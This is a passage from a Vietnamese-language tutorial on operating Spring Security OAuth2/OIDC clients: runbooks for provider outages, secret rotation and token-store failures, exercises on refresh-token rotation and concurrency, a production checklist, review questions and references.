**Khắc phục:** triển khai per-connection single-flight + fencing/versioned updates; điều tra token-family revocation; reauthorization khi provider không thể khôi phục.

## 36. Runbook D — Provider 503 và nhiều token bị xóa

**Triệu chứng:** một OP outage làm hàng loạt connections mất token.

**Kiểm tra:** custom failure handler có xóa authorized client trên **mọi** exception? Có nhầm Token Endpoint 503 với `invalid_grant`?

**Khắc phục:** phân loại transient vs permanent, dừng blanket deletion, bounded retry/backoff/circuit breaker, giữ valid state, khôi phục connection theo consent policy.

## 37. Runbook E — `invalid_client` sau rotate secret

**Triệu chứng:** login và refresh thất bại ở Token Endpoint sau deployment.

**Kiểm tra:** client ID/secret version, client authentication method, OP overlap, pod rollout, secret manager access, tenant/realm.

**Khắc phục:** nếu old secret vẫn hợp lệ có thể rollback secret reference; nếu đã revoke, cần new credential/forward-fix. Không dùng emergency admin secret hoặc log raw secret.

## 38. Runbook F — Token database/KMS unavailable

**Triệu chứng:** app có user session nhưng không load/refresh được authorized client.

**Kiểm tra:** DB connection pool, TLS, privileges, schema migration, KMS key version/decrypt permissions, network.

**Khắc phục:** fail safely với lỗi service/degraded UX. Không tự lấy một token cache cũ chưa kiểm tra expiry, không fallback sang plaintext filesystem, không disable encryption. Sau khôi phục kiểm tra rotation state/outcome unknown.

## 39. Bài tập mở rộng

### Bài tập 1 — Persistent store

Thay in-memory authorized-client service bằng JDBC, chạy test login, restart app và xác minh authorized client còn trong database.

**Đạt:** record load được sau restart; API không lộ token.

### Bài tập 2 — Rotation

Mock OP trả A2/R2 sau khi nhận R1. Trigger refresh và reload DB.

**Đạt:** A2/R2 được lưu; R1 không còn là Refresh Token current trong store.

### Bài tập 3 — No new Refresh Token

Mock OP trả A2 nhưng không trả refresh token.

**Đạt:** vẫn giữ R1 khi provider contract cho phép, không set `null`.

### Bài tập 4 — Concurrent refresh

Hai managers/service instances cùng dùng PostgreSQL. Chạy requests đồng thời với fake OP one-time rotation.

**Đạt:** chỉ một remote refresh cho R1, cả hai nhận authorized client mới hoặc một request trả controlled retry outcome không bị lặp token.

### Bài tập 5 — Stale cleanup

Ép request B có snapshot version 7, request A commit version 8, B nhận `invalid_grant`.

**Đạt:** B không xóa version 8; security event ghi category/version an toàn.

### Bài tập 6 — OP 503

Đổi fake OP từ success sang 503.

**Đạt:** store không xóa authorized client do outage, retry bounded, không bão token requests.

### Bài tập 7 — DB failure sau rotate

Để OP trả R2 rồi giả lập database write failure.

**Đạt:** không retry R1 vô hạn, có recovery state và không rò R2 vào logs.

### Bài tập 8 — Provider/user isolation

Tạo Alice/Bob, `company`/`partner` connections, cố tình dùng trùng email/raw subject.

**Đạt:** không load/refresh/delete token chéo identity hoặc registration.

### Bài tập 9 — KMS rotation

Re-encrypt records bằng data-key/key-version mới, test restore và CAS đồng thời.

**Đạt:** tokens giải mã đúng khi key được phép; không downgrade sang plaintext.

### Bài tập 10 — Logout/disconnect

Xóa local authorized client và gọi test revocation endpoint khi policy yêu cầu.

**Đạt:** phân biệt local delete với remote revoke; 503 giữ `REVOKE_PENDING` thay vì báo success giả.

## 40. Production checklist

| Hạng mục | Câu hỏi cần trả lời |
| --- | --- |
| Store | Dùng durable shared store, không in-memory production? |
| Schema | Migration đúng Spring Security version/driver? |
| Startup | Restart/rolling deploy vẫn load được authorized client? |
| Identity | Principal key và issuer namespace đúng? |
| Token protection | TLS, access controls, backup/KMS/envelope encryption? |
| Retention | Expired/revoked credentials được cleanup có kiểm soát? |
| Refresh semantics | OP rotate/expire/replay policy được xác nhận? |
| New Refresh Token | Lưu atomically với Access Token mới? |
| Missing Refresh Token | Theo contract giữ token cũ đúng? |
| Concurrency | Single-flight trước OP và CAS/fencing sau OP? |
| Failure cleanup | Không delete bản mới bởi stale `invalid_grant`? |
| Unknown outcome | Timeout/DB failure không retry R1 vô hạn? |
| API | Audience/scope/tenant authorization đúng? |
| Handler | Token Endpoint failures khác Resource Server 401/403? |
| Secret rotation | Client secret/key update không phá granted tokens? |
| Provider isolation | Không gửi Refresh Token A tới provider B? |
| Session | HttpSession/WebSession khác authorized-client store? |
| Logout/revocation | Local remove và remote revoke có contract riêng? |
| Observability | Metrics/alerts theo provider, không PII/high-cardinality? |
| Testing | Testcontainers, mock OP, race barriers, failure injection? |
| Rollback | Có recovery/reauth khi R2 đã mất, old token unusable? |

## 41. Câu hỏi ôn tập

**1. `OAuth2AuthorizedClientService` khác `OAuth2AuthorizedClientRepository` như thế nào?**

Service lưu/tải/xóa authorized client theo registration/principal, còn repository có ngữ cảnh HTTP/authentication và có thể delegate service hoặc session implementation. Một ứng dụng cần wiring đúng để login và managers đều dùng persistent backend dự kiến.

**2. Dùng JDBC service có đủ bảo đảm Refresh Token rotation an toàn trên nhiều pods không?**

Chưa. JDBC giải quyết durability, không mặc định giải quyết duplicate remote refresh, stale writes/failure cleanup hoặc application-layer encryption.

**3. Vì sao CAS không đủ để ngăn provider revoke token family?**

CAS chỉ chặn cập nhật/xóa database sai version; hai requests vẫn có thể đã gửi cùng R1 tới OP. Cần single-flight trước remote call.

**4. Khi OP trả R2, có được tiếp tục lưu R1 không?**

Không theo rotation semantics; phải thay current Refresh Token bằng R2 và discard R1. Nếu OP không phát new Refresh Token thì xử lý theo contract giữ refresh token cũ.

**5. `invalid_grant` luôn chứng minh token bị đánh cắp?**

Không. Có thể là expired/revoked grant, client mismatch hoặc concurrency race. Tuy vậy, OP reuse detection vẫn cần xử lý nghiêm túc theo incident policy.

**6. Khi Token Endpoint 503, có nên xóa authorized client?**

Không mặc định. Đây có thể là transient outage, cần bounded retry/degraded handling, không xóa valid grants.

**7. Khi timeout refresh, có được retry R1 vô hạn?**

Không. OP có thể đã rotate R1→R2 mà response bị mất; retry R1 có thể bị coi là replay.

**8. Có thể dùng `synchronized` để đồng bộ refresh trên cluster không?**

Không. `synchronized` chỉ hoạt động trong một JVM; cần distributed coordination với fencing và versioned persistence.

**9. Xóa authorized client local có revoke Refresh Token tại OP không?**

Không. Remote revocation dùng endpoint/protocol riêng khi provider hỗ trợ.

**10. Nếu browser mất HTTP session sau restart nhưng JDBC record còn, có phải lưu token thất bại?**

Không. HTTP session/SecurityContext và authorized-client persistence có lifecycle và backend khác nhau.

## 42. Tài liệu tham khảo

- Spring Security — OAuth2 Client (Servlet): https://docs.spring.io/spring-security/reference/servlet/oauth2/client/index.html
- Spring Security — Authorized Clients: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/authorized-clients.html
- Spring Security — OAuth2 Login (Servlet): https://docs.spring.io/spring-security/reference/servlet/oauth2/login/index.html
- Spring Security — Core Interfaces and Classes: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/core.html
- Spring Security — Reactive OAuth2 Client: https://docs.spring.io/spring-security/reference/reactive/oauth2/client/index.html
- Spring Security — Reactive OAuth2 Client Core: https://docs.spring.io/spring-security/reference/reactive/oauth2/client/core.html
- Spring Security — OAuth2AuthorizedClientManager Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/OAuth2AuthorizedClientManager.html
- Spring Security — JdbcOAuth2AuthorizedClientService Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/JdbcOAuth2AuthorizedClientService.html
- Spring Security — AuthorizedClientServiceOAuth2AuthorizedClientManager Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/AuthorizedClientServiceOAuth2AuthorizedClientManager.html
- Spring Security — DefaultOAuth2AuthorizedClientManager Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/DefaultOAuth2AuthorizedClientManager.html
- Spring Framework — Transactions: https://docs.spring.io/spring-framework/reference/data-access/transaction.html
- Spring Boot — SQL Database Initialization: https://docs.spring.io/spring-boot/reference/how-to/data-initialization.html
- Testcontainers — PostgreSQL Module: https://java.testcontainers.org/modules/databases/postgres/
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
- RFC 6749 — OAuth 2.0 Authorization Framework, Refreshing an Access Token: https://www.rfc-editor.org/rfc/rfc6749#section-6
- RFC 9700 — OAuth 2.0 Security Best Current Practice: https://www.rfc-editor.org/rfc/rfc9700
- RFC 7009 — OAuth 2.0 Token Revocation: https://www.rfc-editor.org/rfc/rfc7009
- RFC 6750 — Bearer Token Usage: https://www.rfc-editor.org/rfc/rfc6750
- RFC 8705 — Mutual TLS OAuth2: https://www.rfc-editor.org/rfc/rfc8705
- RFC 9449 — DPoP: https://www.rfc-editor.org/rfc/rfc9449
- OWASP — Secrets Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- OWASP — Logging Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- OWASP — Cryptographic Storage Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html

## 43. Tổng kết

~~~text
OIDC Login / OAuth2 Authorization
   |
   v
OAuth2AuthorizedClient (registration + principal + tokens)
   |
   v
Persistent OAuth2AuthorizedClientService
   |
   +-- JDBC baseline: durability after restart / shared DB
   +-- Protected storage: access control + encryption + backups
   |
   v
OAuth2AuthorizedClientManager
   |
   +-- Access Token still valid -> use it
   |
   +-- Access Token expires + Refresh Token available
           |
           v
      Per-connection single-flight before Token Endpoint
           |
           v
      OP rotates Refresh R1 -> R2
           |
           v
      Conditional versioned CAS save + encrypted tokens
           |
           +-- success: use Access A2
           +-- stale snapshot: reload and reconcile
           +-- invalid_grant: conditional cleanup + reauth policy
           +-- 503/timeout: bounded recovery, don't delete blindly
~~~

**Sáu bài học quan trọng nhất:**

1. **Persistence và rotation là hai vấn đề khác nhau.** `JdbcOAuth2AuthorizedClientService` giúp authorized clients tồn tại sau restart, nhưng không mặc định đồng bộ refresh giữa nhiều nodes.
2. **Refresh Token mới phải được lưu nhất quán.** Khi OP rotate R1→R2, database và manager phải dùng R2; không làm mất R2 do stale success/failure handlers.
3. **Single-flight trước OP, CAS sau OP.** Chỉ CAS không ngăn hai remote calls dùng R1; chỉ local `synchronized` không bảo vệ cluster.
4. **Phân biệt `invalid_grant` và lỗi tạm thời.** Token Endpoint 503/timeout không đồng nghĩa revoked grant, nhưng timeout có thể có outcome unknown khiến retry mù quáng nguy hiểm.
5. **Token store là kho credential nhạy cảm.** Bảo vệ bằng least privilege, TLS, encryption/KMS, backup/retention và tuyệt đối không log raw Access/Refresh Tokens.
6. **Chứng minh bằng integration tests.** Test save/reload, real DB, controlled OP rotation, concurrent requests, stale failure cleanup, DB write failure, provider isolation và đúng policy reauthorization.

Một hệ thống OAuth2/OIDC Client vận hành đáng tin cậy không chỉ lưu được token sau restart; nó còn **lưu đúng phiên bản token, ngăn sử dụng lại Refresh Token ngoài ý định, kiểm soát lỗi khi provider/DB không chắc chắn và duy trì ranh giới bảo mật giữa các users, clients và tenants**.
